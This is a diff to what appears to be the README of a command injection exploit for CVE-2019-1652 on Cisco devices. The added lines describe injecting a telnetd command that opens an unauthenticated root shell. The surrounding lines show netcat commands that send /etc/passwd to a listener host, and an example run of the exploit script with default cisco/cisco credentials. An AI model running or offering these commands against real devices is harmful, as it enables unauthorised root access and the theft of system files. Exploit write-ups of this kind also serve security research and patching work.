@@ -57,6 +57,8 @@ CVE-2019-1652 outlines a trivial shell command injection vulnerability, which re
 
 The command injection is blind, so you won't get any output. The environment is an incredibly limited Busybox setup with a crippled netcat, and the boxes are mips64, so I didn't bother writing a reverse-shell exploit this time. You can, however, get command output by doing stuff like `cat /etc/passwd | nc HOST PORT` and having a listener running, or whatever. 
 
+You can also inject a command like `telnetd -l /bin/sh -p 1337` and connect to the resultant telnet service, which will serve you up a nice unauthenticated root shell.
+
 Example run of the exploit below:  
 ```
 $ python exec_cmd.py -t x.x.x.x -s -p 8443 -U cisco -P cisco -c "cat /etc/passwd | nc x.x.x.x 1337"
